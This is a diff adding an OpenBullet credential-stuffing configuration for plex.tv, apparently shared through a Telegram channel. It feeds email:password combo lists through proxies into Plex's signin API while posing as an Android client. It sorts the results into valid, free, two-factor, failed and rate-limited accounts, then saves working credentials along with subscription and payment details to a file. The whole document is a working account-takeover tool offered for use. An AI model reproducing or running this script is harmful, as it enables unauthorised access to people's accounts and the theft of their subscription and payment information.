@@ -1,0 +1,121 @@
+[SETTINGS]
+{
+  "Name": "plex.tv",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-16T20:23:42.3172485+04:30",
+  "AdditionalInfo": "Telegram Channel: https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 338942927
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var Rnd = uuidv4();
+END SCRIPT -> VARS "Rnd"
+
+#Rnd2 FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "Rnd2" 
+
+#Login REQUEST POST "https://plex.tv/api/v2/users/signin?includeProviders=1&X-Plex-Token=YsZsh2rmVrUaMCJkrXTL&X-Plex-Language=en-us" EncodeContent=TRUE 
+  CONTENT "password=<PASS>&login=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "X-Plex-Platform: Android" 
+  HEADER "X-Plex-Platform-Version: 5.1.1" 
+  HEADER "X-Plex-Version: 8.17.0.25120" 
+  HEADER "X-Plex-Device: LGM-V300K" 
+  HEADER "X-Plex-Product: Plex for Android (Mobile)" 
+  HEADER "X-Plex-Client-Platform: Android" 
+  HEADER "X-Plex-Client-Identifier: <Rnd2>-com-plexapp-android" 
+  HEADER "X-Plex-Provides: player,pubsub-player,controller" 
+  HEADER "X-Plex-Model: joan_kt_kr" 
+  HEADER "X-Plex-Device-Vendor: LGE" 
+  HEADER "X-Plex-Device-Screen-Resolution: 960x540 (Mobile)" 
+  HEADER "X-Plex-Device-Screen-Density: 160" 
+  HEADER "X-Plex-Advertising-Identifier: <Rnd>" 
+  HEADER "X-Plex-Advertising-DoNotTrack: 0" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "X-Plex-Sync-Version: 2" 
+  HEADER "X-Plex-Provider-Version: 3.2.0" 
+  HEADER "X-Plex-Features: external-media,indirect-media" 
+  HEADER "X-Plex-Device-Name: LGM-V300K" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; LGM-V300K Build/N2G47H)" 
+  HEADER "Host: plex.tv" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "email=\"<USER>\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "state=\"active\"/>" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" EqualTo "401" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "verification" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "429" 
+
+#Status PARSE "<SOURCE>" LR "status=\"" "\"" CreateEmpty=FALSE -> CAP "Status" 
+
+#subscribedAt PARSE "<SOURCE>" LR "subscribedAt=\"" " " CreateEmpty=FALSE -> CAP "subscribedAt" 
+
+#paymentService PARSE "<SOURCE>" LR "paymentService=\"" "\"" CreateEmpty=FALSE -> CAP "paymentService" 
+
+#Subscription PARSE "<SOURCE>" LR "subscriptionDescription=\"" "\"" CreateEmpty=FALSE -> CAP "Subscription" 
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
+#Save UTILITY File "plex.tv.txt" Append "<USER>:<PASS>\\nStatus: <Status>\\nsubscribedAt: <subscribedAt>\\npaymentService: <paymentService>\\nSubscription: <Subscription>\\nTelegram Channel: https://t.me/OpenBulletChannel\\n----------------------------------------------------------------------------\\n" -> VAR "Save" 
+
